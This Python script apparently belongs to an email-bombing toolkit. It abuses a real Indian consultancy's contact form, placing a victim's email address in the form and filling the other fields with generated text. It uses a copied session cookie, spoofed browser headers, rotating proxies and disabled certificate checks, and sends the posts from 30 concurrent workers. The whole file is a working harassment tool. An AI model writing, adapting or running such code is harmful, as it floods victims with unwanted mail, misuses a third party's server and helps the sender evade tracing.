from os.path import basename

import requests

from module import Spam

cookies = {
    'PHPSESSID': 'j6p9tqb12pfcj0aiehsbisgsj7',
}

headers = {
    'Accept': '*/*',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'PHPSESSID=j6p9tqb12pfcj0aiehsbisgsj7',
    'Origin': 'http://www.supremeconsultants.in',
    'Referer': 'http://www.supremeconsultants.in/Contact.php',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
}

params = {
    'type': 'contactus',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = {
            'name': self.get_text(),
            'email': target,
            'mobile': '123123',
            'year': self.get_text(),
            'comments': self.get_text(),
        }

        response = requests.post(
            'http://www.supremeconsultants.in/online/members/process_dream.php',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
            verify=False, proxies=self.get_proxies()
        )
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), 'processing_note')
    res = spam.send_post()
    if res:
        spam.run_concurrently(30)


if __name__ == '__main__':
    main()
